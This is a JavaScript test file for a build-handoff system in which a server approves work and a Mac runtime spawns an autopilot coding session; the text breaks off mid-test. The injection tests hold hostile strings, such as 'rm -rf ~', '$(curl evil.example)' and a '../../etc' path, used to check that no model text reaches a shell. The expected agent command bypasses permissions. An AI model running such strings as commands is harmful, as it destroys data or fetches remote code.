// The product handoff split across runtimes: the server records a Go as an approved handoff that carries the requirement
// (no repo write, no session); the runtime with the repo pulls it (builds_pull), opens the ticket and its autopilot session
// as a local Go does, watches the ticket from its own `builds` table and reports through the insight team's handoff_events
// queue; the server folds the events back (handoff_events_apply), raises the founder's cards and keeps their answers, which
// the Mac reads and writes to the ticket. The `soot` CLI is a stub (data query / insert against a file), `bbs` the usual fake.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { chmodSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { world, ITEM, DAY } from './world.mjs';
import { fakeBbs, scratchRepo } from './fixtures.mjs';
import { NUDGE_AFTER_MS, RESTART_GRACE_MS } from '../tools/lib/watch.mjs';

const TOKEN = 'srt_build-call-token-not-a-secret';
const RUNTIME = 'http://127.0.0.1:7788';
const PAGE = { page: { page: 'company' } };
const T1 = 'bs-tkt00001', T2 = 'bs-tkt00002';
const A1 = '2026-11-09T02:00:00Z', A2 = '2026-11-09T03:00:00Z';
const ask = (note, at = A1, kind = 'spec') => ({ state: 'pending', kind, note, at });
const OTHER = { ...ITEM.product, title: 'Gợi ý đọc tiếp theo thể loại' };
const of = (calls, verb) => calls.filter(c => c.argv.includes(verb));
let n = 0;
const rid = () => `req-bd${String(++n).padStart(8, '0')}`;

/**
 * A `soot` stub: `data query` prints query.json (narrowed by --filter while the file `filter` exists), `data insert`
 * appends its --row to inserts (fails while the file `fail-insert` exists); every argv is logged.
 */
function stubSoot() {
  const dir = mkdtempSync(join(tmpdir(), 'cl-build-soot-'));
  const bin = join(dir, 'soot');
  writeFileSync(join(dir, 'query.json'), JSON.stringify({ rows: [] }));
  writeFileSync(bin, `#!/usr/bin/env node
const fs = require('node:fs'), path = require('node:path');
const dir = ${JSON.stringify(dir)}, a = process.argv.slice(2);
fs.appendFileSync(path.join(dir, 'log'), JSON.stringify({ argv: a, token: process.env.SOOT_RUNTIME_TOKEN === ${JSON.stringify(TOKEN)}, url: process.env.SOOT_RUNTIME_URL }) + '\\n');
if (a[0] === 'data' && a[1] === 'query') {
  if (fs.existsSync(path.join(dir, 'fail-query'))) { console.error('data.read not granted'); process.exit(1); }
  const all = JSON.parse(fs.readFileSync(path.join(dir, 'query.json'), 'utf8'));
  const f = fs.existsSync(path.join(dir, 'filter')) && a.includes('--filter') ? JSON.parse(a[a.indexOf('--filter') + 1]) : {};
  process.stdout.write(JSON.stringify({ rows: all.rows.filter(r => Object.entries(f).every(([k, v]) => r[k] === v)) })); process.exit(0);
}
if (a[0] === 'data' && a[1] === 'insert') { if (fs.existsSync(path.join(dir, 'fail-insert'))) { console.error('queue unreachable'); process.exit(1); } fs.appendFileSync(path.join(dir, 'inserts'), a[a.indexOf('--row') + 1] + '\\n'); console.log('{"id":"r1"}'); process.exit(0); }
process.exit(1);
`);
  chmodSync(bin, 0o755);
  const lines = f => (existsSync(join(dir, f)) ? readFileSync(join(dir, f), 'utf8').trim().split('\n').filter(Boolean) : []);
  return {
    bin, rows: rows => writeFileSync(join(dir, 'query.json'), JSON.stringify({ rows })),
    flag: (name, on) => (on ? writeFileSync(join(dir, name), '') : rmSync(join(dir, name), { force: true })),
    calls: () => lines('log').map(l => JSON.parse(l)), inserts: () => lines('inserts').map(l => JSON.parse(l)),
  };
}

/** The server: no repo, decides and folds. */
async function server(extra = {}, items = [ITEM.product]) {
  const w = world({ env: extra });
  await w.call('digest_save', { opportunities: items });
  const refs = w.rows('opportunities').map(o => o.ref);
  const ref = refs[0];
  return { w, ref, refs, go: (id = ref) => w.call('page_action', { op: 'go', id, request_id: rid() }, PAGE) };
}
/** The Mac: repo + bbs + soot with a runtime token. */
function mac(over = {}) {
  const b = fakeBbs(), cli = stubSoot(), repo = scratchRepo();
  const w = world({ env: { PRODUCT_REPO: repo, BBS_BIN: b.bin, LOOP_SOOT_BIN: cli.bin, SOOT_RUNTIME_URL: RUNTIME, SOOT_RUNTIME_TOKEN: TOKEN, ...over } });
  return { w, b, cli, repo };
}
const approvedRow = async s => { await s.go(); return { ...s.w.rows('handoffs')[0] }; };

/**
 * Both runtimes with the wire between them: every Mac tool call reads the server's handoffs as they are at that moment, and
 * what it inserted into the queue is on the server right after. Every opportunity is approved (Go) on the server first.
 */
async function pair({ items = [ITEM.product], macEnv = {}, serverEnv = {} } = {}) {
  const s = await server(serverEnv, items);
  for (const ref of s.refs) await s.go(ref);
  const m = mac(macEnv);
  m.cli.flag('filter', true);
  let told = 0;
  const tick = async tool => {
    m.cli.rows(s.w.rows('handoffs'));
    const out = await m.w.call(tool);
    const sent = m.cli.inserts();
    for (const r of sent.slice(told)) await s.w.store.insert('handoff_events', r);
    told = sent.length;
    return out;
  };
  return {
    s, m, ref: s.ref, refs: s.refs,
    pull: () => tick('builds_pull'), watch: () => tick('team_watch'), fold: () => s.w.call('handoff_events_apply'),
    h: (ref = s.ref) => s.w.rows('handoffs').find(x => x.opportunity === ref),
    build: (ref = s.ref) => m.w.rows('builds').find(x => x.handoff === ref),
    page: (op, extra = {}, ref = s.ref) => s.w.call('page_action', { op, id: ref, request_id: rid(), ...extra }, PAGE),
    events: () => m.cli.inserts(),
  };
}

test('server: a product Go records an approved handoff with requirement, product and target outcome, and writes and spawns nothing', async () => {
  const s = await server({ BBS_BIN: fakeBbs().bin });
  const out = await s.go();
  assert.equal(out.handoff.state, 'approved');
  const h = s.w.rows('handoffs')[0];
  assert.equal(h.state, 'approved');
  assert.deepEqual([h.product, h.target_outcome, h.opportunity, h.repo], ['lohi', 'support_handoffs', s.ref, null]);
  assert.match(h.requirement, new RegExp(`^# REQ-${s.ref}: Hoàn tiền tự động`));
  assert.match(h.requirement, /approved by the founder with Go/);
  assert.ok(!existsSync(join(s.w.env.BABYSIT_HOME, 'requirements')), 'no requirement file on the server');
  assert.equal(s.w.rows('decisions').filter(d => d.decision === 'go').length, 1);
});

test('a run of another product (SOOT_PRODUCT) cannot file or decide this product\'s work, and its repo is never used for it', async () => {
  const b = fakeBbs(), repo = scratchRepo();
  const s = await server({ PRODUCT_REPO: repo, BBS_BIN: b.bin });
  s.w.env.SOOT_PRODUCT = '2novel';
  await assert.rejects(s.w.call('digest_save', { opportunities: [{ ...ITEM.product, title: 'Một cơ hội khác của lohi' }] }), /không phải 2novel/);
  await assert.rejects(s.w.call('decide', { id: s.ref, decision: 'go' }), /thuộc sản phẩm lohi, không phải 2novel/);
  assert.equal(b.calls().length, 0);
  assert.ok(!existsSync(join(s.w.env.BABYSIT_HOME, 'requirements')));
});

test('single runtime with a repo: a Go still starts the session directly and team_watch owns the lifecycle (nothing goes through events)', async () => {
  const b = fakeBbs(), repo = scratchRepo();
  const s = await server({ PRODUCT_REPO: repo, BBS_BIN: b.bin });
  assert.equal((await s.go()).handoff.state, 'spawned');
  assert.equal(of(b.calls(), 'spawn').length, 1);
  b.ticket(T1, { status: 'done' });
  const done = await s.w.call('team_watch');
  assert.equal(done.outcomes[0].id, 'requirement_shipped');
  assert.equal(s.w.rows('builds').length, 0);
  assert.equal(s.w.rows('handoff_events').length, 0);
});

test('builds_pull: starts the approved handoff like a local Go, keeps a builds row, reports started, and never pulls it twice', async () => {
  const s = await server();
  const row = await approvedRow(s);
  const m = mac();
  m.cli.rows([row]);
  const out = await m.w.call('builds_pull');
  assert.deepEqual(out.started, [{ handoff: s.ref, state: 'spawned' }]);
  // The query is the insight team's handoffs item (approved, then the ones queued here), through the call's own token.
  const qs = m.cli.calls().filter(c => c.argv[1] === 'query');
  assert.deepEqual(qs[0].argv.slice(0, 9), ['data', 'query', '--team', 'insight', '--item', 'handoffs', '--filter', '{"state":"approved"}', '--limit']);
  assert.deepEqual(qs.map(c => c.argv[7]), ['{"state":"approved"}', '{"state":"queued"}']);
  assert.ok(m.cli.calls().every(c => c.token && c.url === RUNTIME));
  // The requirement is the server's text, written beside the tickets (not in the repo); one ticket, one session.
  const req = join(m.w.env.BABYSIT_HOME, 'requirements', m.repo.split('/').pop(), `REQ-${s.ref}.md`);
  assert.equal(readFileSync(req, 'utf8'), row.requirement);
  const calls = m.b.calls();
  assert.deepEqual(calls.map(c => c.argv.slice(0, 2).join(' ')), ['ticket ensure', 'team worker-command', 'team spawn']);
  assert.deepEqual(calls[0].argv, ['ticket', 'ensure', '--from-input-file', req, '--no-branch']);
  assert.deepEqual(calls[2].argv.slice(0, 5), ['team', 'spawn', `loop-${s.ref.toLowerCase()}`, '--dir', m.repo]);
  const build = m.w.rows('builds')[0];
  assert.deepEqual([build.handoff, build.state, build.product, build.team_id, build.ticket, build.pushed], [s.ref, 'spawned', 'lohi', null, T1, 'started']);
  assert.match(build.title, /Hoàn tiền tự động/);
  assert.deepEqual(m.cli.inserts().map(r => [r.handoff, r.state, r.ticket, r.asked, r.product]), [[s.ref, 'started', T1, null, 'lohi']]);
  assert.ok(!('team_id' in m.cli.inserts()[0]), 'the event names the ticket, not a team');
  const ins = m.cli.calls().find(c => c.argv[1] === 'insert');
  assert.deepEqual(ins.argv.slice(0, 6), ['data', 'insert', '--team', 'insight', '--queue', 'handoff_events']);
  // No second approval, no second ticket, no second session.
  const again = await m.w.call('builds_pull');
  assert.equal(again.done, true);
  assert.deepEqual([of(m.b.calls(), 'ensure').length, of(m.b.calls(), 'spawn').length, m.cli.inserts().length], [1, 1, 1]);
});

test('builds_pull: INSIGHT_TEAM and the product filter reach the query; another product\'s row is never built here', async () => {
  const s = await server();
  const row = await approvedRow(s);
  const m = mac({ SOOT_PRODUCT: '2novel', INSIGHT_TEAM: 'insights' });
  m.cli.rows([row, { ...row, opportunity: 'OP-0000BEEF', product: '2novel' }]);
  const out = await m.w.call('builds_pull');
  const q = m.cli.calls().find(c => c.argv[1] === 'query');
  assert.equal(q.argv[3], 'insights');
  assert.equal(q.argv[7], '{"state":"approved","product":"2novel"}');
  assert.deepEqual(out.skipped.map(x => x.why), ['other_product']);
  assert.deepEqual(out.started.map(x => x.handoff), ['OP-0000BEEF'], 'the 2novel row has no usable requirement, so only the lohi row is excluded here');
});

test('no model text reaches a command line: the session command is built from the ticket id alone', async () => {
  const evil = { ...ITEM.product, title: 'Hoàn tiền\'; rm -rf ~ # "$(curl evil.example)"', summary: '`touch /tmp/pwned` && $(id) ; echo \'x\'' };
  const p = await pair({ items: [evil] });
  assert.equal((await p.pull()).started[0].state, 'spawned');
  const calls = p.m.b.calls();
  assert.equal(of(calls, 'spawn')[0].argv.at(-1), `AGENT_ROLE=dashboard BABYSIT_TICKET=${T1} claude --dangerously-skip-permissions '/bbs:autopilot --auto builder ${T1}'`);
  assert.equal(p.build().command, `cd '${p.m.repo}' && AGENT_ROLE=dashboard BABYSIT_TICKET=${T1} claude --dangerously-skip-permissions '/bbs:autopilot --auto builder ${T1}'`);
  assert.deepEqual(of(calls, 'worker-command')[0].argv, ['team', 'worker-command', '--agent', 'claude', '--skill', 'autopilot', '--prompt', `--auto builder ${T1}`, '--dir', p.m.repo]);
  const lines = JSON.stringify(calls.map(c => c.argv));
  for (const bit of ['rm -rf', 'curl', 'touch', 'Hoàn tiền']) assert.ok(!lines.includes(bit), bit);
  // The founder's own words go to bbs as one argument, never through a shell.
  p.m.b.ticket(T1, { status: 'backlog', approval: ask('Confirm the spec') });
  await p.watch(); await p.fold();
  const note = 'Bỏ phần "tự động"; chỉ làm $(thủ công) \'trước\'';
  await p.page('answer', { action: 'redirect', note });
  await p.watch();
  assert.deepEqual(of(p.m.b.calls(), 'resolve').map(c => c.argv), [['ticket', 'approval', 'resolve', '--action', 'redirect', '--note', note]]);
});

test('builds_pull: refusals are quiet and start nothing (no repo, no token, no soot, unreadable data, a malformed row)', async () => {
  const s = await server();
  const row = await approvedRow(s);
  // No PRODUCT_REPO: this is the server.
  const server2 = world({ env: { LOOP_SOOT_BIN: stubSoot().bin, SOOT_RUNTIME_URL: RUNTIME, SOOT_RUNTIME_TOKEN: TOKEN } });
  assert.deepEqual([(await server2.call('builds_pull')).skipped, (await server2.call('builds_pull')).key], [true, 'PRODUCT_REPO']);
  // No runtime token: the grant is missing.
  const m = mac({ SOOT_RUNTIME_TOKEN: '' });
  m.cli.rows([row]);
  const noToken = await m.w.call('builds_pull');
  assert.deepEqual([noToken.skipped, noToken.reason_code, noToken.reason], [true, 'handoffs_unreadable', 'no_runtime_token']);
  assert.equal(m.cli.calls().length, 0);
  // No soot binary.
  const noSoot = mac({ LOOP_SOOT_BIN: '/nonexistent/soot' });
  assert.equal((await noSoot.w.call('builds_pull')).reason, 'no_soot');
  // data.read refused by the runtime.
  const m2 = mac();
  m2.cli.flag('fail-query', true);
  const bad = await m2.w.call('builds_pull');
  assert.deepEqual([bad.skipped, bad.reason, bad.notify], [true, 'data_failed', false]);
  assert.match(bad.detail, /data\.read not granted/);
  assert.equal(m2.b.calls().length, 0);
  // Malformed rows: a key that is not a ref, a requirement that is not ours, a row that is neither approved nor queued.
  const m3 = mac();
  m3.cli.rows([{ ...row, opportunity: '../../etc' }, { ...row, requirement: 'rm -rf /' }, { ...row, opportunity: 'OP-0000AAAA', state: 'spawned' }]);
  const out = await m3.w.call('builds_pull');
  assert.deepEqual(out.skipped.map(x => x.why), ['bad_key', 'bad_requirement', 'not_approved']);
  assert.equal(m3.b.calls().length, 0);
  assert.equal(m3.w.rows('builds').length, 0);
  assert.ok(!existsSync(join(m3.w.env.BABYSIT_HOME, 'requirements')));
});

test('builds_pull: bbs absent is draft_ready (no event, one reminder, started by itself once bbs is there); an unwritable repo is the one loud answer and is retried', async () => {
  const p = await pair({ macEnv: { BBS_BIN: '/nonexistent/bbs' } });
  const out = await p.pull();
  assert.deepEqual(out.started, [{ handoff: p.ref, state: 'draft_ready' }]);
  assert.equal(p.events().length, 0, 'the session does not exist: nothing to report');
  assert.deepEqual([p.build().ticket, p.build().command], [null, null]);
  assert.match(p.build().note, /chưa có bbs/);
  assert.ok(existsSync(p.m.w.reqPath(p.m.repo, p.ref)), 'the requirement is still written');
  // Still no bbs: the row and its reminder clock are left alone, and the founder is reminded once after the wait.
  const stamp = p.build().updated_at;
  assert.deepEqual((await p.pull()).skipped, [{ handoff: p.ref, why: 'not_ready' }]);
  assert.equal(p.build().updated_at, stamp);
  assert.deepEqual(await p.watch(), { done: true }, 'soon after the Go: quiet');
  p.m.w.now += NUDGE_AFTER_MS + 60_000;
  const remind = await p.watch();
  assert.deepEqual([remind.raise.map(c => c.id), remind.notify], [[`company:unstarted:${p.ref}`], false]);
  assert.equal(p.h().state, 'approved', 'the server heard nothing yet');
  // bbs installed: the next pull opens the ticket and the session; nobody has to press anything.
  p.m.w.env.BBS_BIN = p.m.b.bin;
  assert.deepEqual((await p.pull()).started, [{ handoff: p.ref, state: 'spawned' }]);
  assert.deepEqual(p.events().map(r => [r.state, r.ticket]), [['started', T1]]);
  assert.ok((await p.watch()).settle.includes(`company:unstarted:${p.ref}`), 'the reminder is settled once the session exists');
  // A repo that is not a directory.
  const s = await server();
  const row = await approvedRow(s);
  const m = mac({ PRODUCT_REPO: '/nonexistent/repo' });
  m.cli.rows([row]);
  const loud = await m.w.call('builds_pull');
  assert.deepEqual([loud.failed[0].why, loud.notify], ['no_repo', true]);
  assert.equal(m.w.rows('builds')[0].state, 'no_repo');
  // Fixing the repo: the next pull starts it (a no_repo build is not "already pulled").
  m.w.env.PRODUCT_REPO = scratchRepo();
  const fixed = await m.w.call('builds_pull');
  assert.equal(fixed.started[0].state, 'spawned');
  assert.equal(m.w.rows('builds').length, 1);
});

test('builds_pull: a ticket that cannot be opened and an agent bbs refuses are draft_ready with the reason, tried again by themselves on the same ticket', async () => {
  const p = await pair();
  p.m.b.fail('ensure');
  assert.deepEqual((await p.pull()).started, [{ handoff: p.ref, state: 'draft_ready' }]);
  assert.match(p.build().note, /Chưa mở được ticket \(ensure: not in a git work tree\)/);
  assert.deepEqual([p.build().ticket, of(p.m.b.calls(), 'worker-command').length, of(p.m.b.calls(), 'spawn').length, p.events().length], [null, 0, 0, 0]);
  // The ticket opens, but the agent would stop on a prompt nobody sees: refused before any terminal opens.
  p.m.b.fail('ensure', false);
  p.m.b.fail('worker');
  assert.deepEqual((await p.pull()).started, [{ handoff: p.ref, state: 'draft_ready' }]);
  assert.match(p.build().note, /has not been told to trust/);
  assert.deepEqual([p.build().ticket, p.build().command, of(p.m.b.calls(), 'spawn').length, p.events().length], [T1, null, 0, 0]);
  assert.deepEqual((await p.pull()).skipped, [{ handoff: p.ref, why: 'not_ready' }]);
  p.m.b.fail('worker', false);
  assert.deepEqual((await p.pull()).started, [{ handoff: p.ref, state: 'spawned' }]);
  assert.equal(of(p.m.b.calls(), 'ensure').length, 2, 'one failed try and one ticket: never a second ticket');
  assert.match(of(p.m.b.calls(), 'spawn')[0].argv.at(-1), new RegExp(`BABYSIT_TICKET=${T1} .*builder ${T1}'$`));
  assert.deepEqual(p.events().map(r => [r.state, r.ticket]), [['started', T1]]);
});

test('builds_pull: Orca not running leaves the command to run by hand; it is never started twice and moves on when the founder ran it', async () => {
  const p = await pair();
  p.m.b.failSpawn(true);
  assert.deepEqual((await p.pull()).started, [{ handoff: p.ref, state: 'draft_ready' }]);
  assert.match(p.build().note, /orca: not running/);
  assert.equal(p.build().command, `cd '${p.m.repo}' && AGENT_ROLE=dashboard BABYSIT_TICKET=${T1} claude --dangerously-skip-permissions '/bbs:autopilot --auto builder ${T1}'`);
  assert.equal(p.events().length, 0);
  // Orca is back, but the founder may be running that command already: a second session is never opened on the same checkout.
  p.m.b.failSpawn(false);
  assert.deepEqual((await p.pull()).skipped, [{ handoff: p.ref, why: 'already_pulled' }]);
  assert.equal(of(p.m.b.calls(), 'spawn').length, 1);
  p.m.w.now += NUDGE_AFTER_MS + 60_000;
  const remind = await p.watch();
  assert.equal(remind.raise[0].id, `company:unstarted:${p.ref}`);
  assert.ok(remind.raise[0].why.includes(p.build().command), 'the reminder carries the command');
  // The founder ran it in a terminal of their own: the build is watched like any other and the server hears of it.
  p.m.b.ticket(T1, { status: 'in_progress' });
  const moved = await p.watch();
  assert.deepEqual([moved.changed, moved.settle], [[{ ref: p.ref, state: 'building' }], [`company:unstarted:${p.ref}`]]);
  assert.deepEqual(p.events().map(r => r.state), ['progress']);
  await p.fold();
  assert.deepEqual([p.h().state, p.h().ticket], ['building', T1]);
});

test('team_watch on the Mac works from builds and reports progress and handover; the founder ships on the server and the Mac closes its build (no outcome or topic there)', async () => {
  const p = await pair();
  await p.pull();
  // Nothing on the ticket yet: the session is reading. Told once (`started`), not again.
  assert.deepEqual((await p.watch()).changed, [{ ref: p.ref, state: 'starting' }]);
  p.m.b.ticket(T1, { status: 'in_progress' });
  const building = await p.watch();
  assert.deepEqual(building.changed, [{ ref: p.ref, state: 'building' }]);
  p.m.b.ticket(T1, { status: 'in_review' });
  const handover = await p.watch();
  assert.deepEqual(handover.changed, [{ ref: p.ref, state: 'delivered' }]);
  assert.equal(handover.raise, undefined, 'the card is raised where the Công ty page is, not on the Mac');
  assert.equal(handover.outcomes, undefined);
  assert.deepEqual(p.events().map(r => [r.state, r.ticket]), [['started', T1], ['progress', T1], ['handover', T1]]);
  for (const verb of ['land', 'release', 'integrate', 'commit', 'push']) assert.ok(!of(p.m.b.calls(), verb).length, verb);
  // The server folds them and raises the one card: a build to commit and ship.
  const folded = await p.fold();
  assert.deepEqual(folded.changed.map(c => c.state), ['spawned', 'building', 'delivered']);
  assert.deepEqual([folded.raise.map(c => c.id), folded.outcomes, folded.notify], [[`company:handover:${p.ref}`], undefined, false]);
  assert.match(folded.raise[0].why, /chưa commit trong kho mã trên máy dựng \(ticket bs-tkt00001\)/);
  assert.deepEqual([p.h().state, p.h().ticket, p.h().repo], ['delivered', T1, null]);
  assert.deepEqual((await p.s.w.call('page_view', {}, PAGE)).handoffs.map(x => [x.opportunity, x.state]), [[p.ref, 'delivered']]);
  // The founder commits, releases and says so on the page: recorded on the next fold, once.
  p.s.w.now += 3_600_000;
  const said = await p.page('shipped');
  assert.equal(said.handoff.released_at, new Date(p.s.w.now).toISOString());
  assert.equal(p.h().state, 'delivered', 'the tick records it');
  const shipped = await p.fold();
  assert.deepEqual([shipped.changed, shipped.outcomes, shipped.settle, shipped.notify], [[{ ref: p.ref, state: 'released' }], [{ id: 'requirement_shipped', count: 1, ref: `req:${p.ref}` }], [`company:handover:${p.ref}`], true]);
  assert.deepEqual([p.h().state, p.h().released_at], ['released', new Date(p.s.w.now).toISOString()]);
  assert.deepEqual(p.s.w.rows('topics').map(t => [t.kind, t.opportunity_ref]), [['launch', p.ref]]);
  assert.deepEqual(await p.fold(), { done: true }, 'shipped once');
  await assert.rejects(p.page('shipped'), /Không có bản dựng/);
  // The Mac reads that it is out: its build is closed, the checkout is free, and it tells the server nothing it already knows.
  const closed = await p.watch();
  assert.deepEqual([closed.changed, closed.outcomes, closed.events], [[{ ref: p.ref, state: 'released' }], undefined, undefined]);
  assert.deepEqual([p.build().state, p.build().released_at, p.build().pushed], ['released', p.h().released_at, 'shipped']);
  assert.equal(p.events().length, 3);
  assert.equal(p.m.w.rows('topics').length, 0);
  assert.deepEqual(await p.watch(), { done: true });
  assert.equal(p.s.w.rows('topics').filter(t => t.kind === 'launch').length, 1);
});

test('a question: one asking event with ticket and asked, one card on the server; the page keeps the answer (no bbs there) and the Mac writes it to the ticket, once', async () => {
  const sb = fakeBbs();
  const p = await pair({ serverEnv: { BBS_BIN: sb.bin } });
  await p.pull();
  p.m.b.ticket(T1, { status: 'backlog', approval: ask('Confirm the spec: /t/requirement.md. Có gồm hoàn tiền một phần không?') });
  const asked = await p.watch();
  assert.deepEqual([asked.changed, asked.raise], [[{ ref: p.ref, state: 'asking' }], undefined]);
  assert.equal(p.build().asked, A1);
  await p.watch();
  const told = p.events().filter(r => r.state === 'asking');
  assert.deepEqual(told.map(r => [r.handoff, r.ticket, r.asked]), [[p.ref, T1, A1]], 'the same question is told once');
  assert.match(told[0].note, /Xác nhận đặc tả: Confirm the spec.*hoàn tiền một phần/);
  // The server shows the question and raises ONE card, restated with the same id on every tick.
  const first = await p.fold();
  assert.deepEqual([p.h().state, p.h().asked, p.h().ticket], ['asking', A1, T1]);
  assert.deepEqual([first.raise.map(c => c.id), first.notify, first.wake], [[`company:ask:${p.ref}:${A1}`], false, false]);
  assert.match(first.raise[0].why, /hoàn tiền một phần/);
  const second = await p.fold();
  assert.deepEqual([second.changed, second.raise.map(c => c.id)], [[], [`company:ask:${p.ref}:${A1}`]]);
  const view = await p.s.w.call('page_view', {}, PAGE);
  assert.deepEqual([view.handoffs[0].state, view.handoffs[0].asked], ['asking', A1]);
  assert.match(view.handoffs[0].detail, /hoàn tiền một phần/);
  // The founder answers on the server's page: the answer waits on the row, tied to this question. No bbs runs there.
  await assert.rejects(p.page('answer', { action: 'redirect' }), /Góp ý cần nói rõ/);
  await assert.rejects(p.page('answer', { action: 'ship-it' }), /action là approve, redirect hoặc drop/);
  const said = await p.page('answer', { action: 'redirect', note: ' Chỉ hoàn toàn bộ, bỏ hoàn một phần ' });
  assert.equal(said.handoff.state, 'answered');
  assert.deepEqual([p.h().state, p.h().answer, p.h().answer_note, p.h().answer_for], ['answered', 'redirect', 'Chỉ hoàn toàn bộ, bỏ hoàn một phần', A1]);
  assert.match(p.h().detail, /Máy dựng nhận câu trả lời/);
  assert.equal(sb.calls().length, 0, 'the server never runs bbs for a build it does not have');
  await assert.rejects(p.page('answer', { action: 'approve' }), /Không có câu hỏi nào/);
  assert.deepEqual((await p.fold()).settle, [`company:ask:${p.ref}`], 'answered: the question card is done');
  // A late copy of the same question does not ask again while its answer is on the way.
  await p.s.w.store.insert('handoff_events', { ...told[0], note: 'Xác nhận đặc tả: (viết lại)' });
  await p.fold();
  assert.deepEqual([p.h().state, p.h().answer], ['answered', 'redirect']);
  // The Mac reads the row and resolves the ticket's approval record, as the bbs dashboard would.
  const moved = await p.watch();
  assert.deepEqual(moved.changed, [{ ref: p.ref, state: 'building' }]);
  const resolve = of(p.m.b.calls(), 'resolve');
  assert.deepEqual(resolve.map(c => [c.argv, c.ticket, c.cwd.split('/').pop()]), [[['ticket', 'approval', 'resolve', '--action', 'redirect', '--note', 'Chỉ hoàn toàn bộ, bỏ hoàn một phần'], T1, p.m.repo.split('/').pop()]]);
  await p.watch(); await p.watch();
  assert.equal(of(p.m.b.calls(), 'resolve').length, 1, 'written once');
  await p.fold();
  assert.equal(p.h().state, 'building');
  // It asks again with the fixed spec: a new event, the server asks again with a new card and the old answer is gone.
  p.m.b.ticket(T1, { status: 'backlog', approval: ask('Confirm the spec: chỉ hoàn toàn bộ.', A2) });
  await p.watch();
  assert.deepEqual(p.events().filter(r => r.state === 'asking').map(r => r.asked), [A1, A2]);
  const reask = await p.fold();
  assert.deepEqual([p.h().state, p.h().asked, p.h().answer, p.h().answer_note, p.h().answer_for], ['asking', A2, null, null, null]);
  assert.deepEqual(reask.raise.map(c => c.id), [`company:ask:${p.ref}:${A2}`]);
  await p.page('answer', { action: 'approve' });
  assert.deepEqual([p.h().answer, p.h().answer_note, p.h().answer_for], ['approve', null, A2]);
  await p.watch();
  assert.deepEqual(of(p.m.b.calls(), 'resolve').at(-1).argv, ['ticket', 'approval', 'resolve', '--action', 'approve']);
  assert.equal(of(p.m.b.calls(), 'resolve').length, 2);
});

test('an answer is for one question: an answer to an older question never reaches a newer one', async () => {
  const p = await pair();
  await p.pull();
  p.m.b.ticket(T1, { status: 'backlog', approval: ask('Confirm the spec', A1) });
  await p.watch(); await p.fold();
  await p.page('answer', { action: 'approve' });
  // Meanwhile the first question was answered at the bbs dashboard and the session asked the next one.
  p.m.b.ticket(T1, { status: 'backlog', approval: ask('Kế hoạch có đổi bảng giá, được không?', A2, 'plan') });
  const raced = await p.watch();
  assert.equal(of(p.m.b.calls(), 'resolve').length, 0, 'the ticket no longer waits on the question that was answered');
  assert.equal(raced.answers_unsent, undefined);
  assert.equal(p.build().asked, A2);
  // The Mac knows the new question; the server row still carries the old answer until it folds the event.
  await p.watch();
  assert.equal(of(p.m.b.calls(), 'resolve').length, 0);
  await p.fold();
  assert.deepEqual([p.h().state, p.h().asked, p.h().answer], ['asking', A2, null]);
  assert.match(p.h().detail, /Câu hỏi về kế hoạch: Kế hoạch có đổi bảng giá/);
  await p.watch();
  assert.equal(of(p.m.b.calls(), 'resolve').length, 0, 'nothing is decided for the founder');
});

test('an answer that cannot be written stays on the server, is reported as answers_unsent and is written on a later tick; Dừng drops the build and frees the checkout', async () => {
  const p = await pair({ items: [ITEM.product, OTHER] });
  const [one, two] = p.refs;
  await p.pull();
  assert.equal(p.build(two).state, 'queued');
  p.m.b.ticket(T1, { status: 'backlog', approval: ask('Confirm the spec') });
  await p.watch(); await p.fold();
  await p.page('answer', { action: 'drop' });
  p.m.b.fail('resolve');
  const stuck = await p.watch();
  assert.equal(stuck.answers_unsent.length, 1);
  assert.deepEqual([stuck.answers_unsent[0].ref, stuck.done], [one, true]);
  assert.match(stuck.answers_unsent[0].why, /ticket is locked/);
  assert.deepEqual([p.build(one).state, p.h(one).state, p.h(one).answer], ['asking', 'answered', 'drop']);
  // The ticket cannot be read at all: the same, and nothing is guessed.
  p.m.b.fail('resolve', false);
  p.m.b.fail('get');
  assert.match((await p.watch()).answers_unsent[0].why, /no such file/);
  assert.equal(of(p.m.b.calls(), 'resolve').length, 1, 'only the try that failed');
  p.m.b.fail('get', false);
  const sent = await p.watch();
  assert.equal(sent.answers_unsent, undefined);
  assert.deepEqual(sent.changed, [{ ref: one, state: 'dropped' }]);
  assert.deepEqual(of(p.m.b.calls(), 'resolve').at(-1).argv, ['ticket', 'approval', 'resolve', '--action', 'drop']);
  assert.equal(p.events().at(-1).state, 'dropped');
  const folded = await p.fold();
  assert.equal(p.h(one).state, 'dropped');
  assert.ok(folded.settle.includes(`company:ask:${one}`));
  assert.equal(folded.outcomes, undefined, 'dropped is not shipped');
  // A dropped build holds nothing: the waiting Go starts on its own ticket.
  assert.deepEqual((await p.pull()).started, [{ handoff: two, state: 'spawned' }]);
  assert.equal(p.build(two).ticket, T2);
});

test('one build per checkout: a second approved handoff waits as queued on both runtimes and starts by itself once the founder shipped the first', async () => {
  const p = await pair({ items: [ITEM.product, OTHER] });
  const [one, two] = p.refs;
  const out = await p.pull();
  assert.deepEqual(out.started, [{ handoff: one, state: 'spawned' }, { handoff: two, state: 'queued' }]);
  assert.match(p.build(two).note, new RegExp(`thay đổi khác chưa phát hành \\(${one}\\)`));
  assert.deepEqual([of(p.m.b.calls(), 'ensure').length, of(p.m.b.calls(), 'spawn').length], [1, 1]);
  assert.deepEqual(p.events().map(r => [r.handoff, r.state]), [[one, 'started'], [two, 'queued']]);
  await p.fold();
  assert.deepEqual([p.h(one).state, p.h(two).state], ['spawned', 'queued']);
  assert.match(p.h(two).note, /chờ tới lượt/);
  // Still busy: nothing new is kept, told or started.
  assert.deepEqual((await p.pull()).skipped, [{ handoff: two, why: 'checkout_busy' }]);
  assert.equal(p.events().length, 2);
  // Built but not shipped still holds the checkout.
  p.m.b.ticket(T1, { status: 'in_review' });
  await p.watch(); await p.fold();
  assert.equal(p.h(one).state, 'delivered');
  assert.equal((await p.pull()).done, true);
  assert.equal(of(p.m.b.calls(), 'spawn').length, 1);
  // The founder says it is out on the server: the Mac frees the checkout on its next watch and the next pull starts the second.
  await p.page('shipped', {}, one);
  await p.fold();
  assert.equal((await p.pull()).done, true, 'the Mac has not read the decision yet');
  await p.watch();
  assert.equal(p.build(one).state, 'released');
  assert.deepEqual((await p.pull()).started, [{ handoff: two, state: 'spawned' }]);
  assert.equal(p.build(two).ticket, T2);
  assert.match(of(p.m.b.calls(), 'spawn').at(-1).argv.at(-1), new RegExp(`BABYSIT_TICKET=${T2} `));
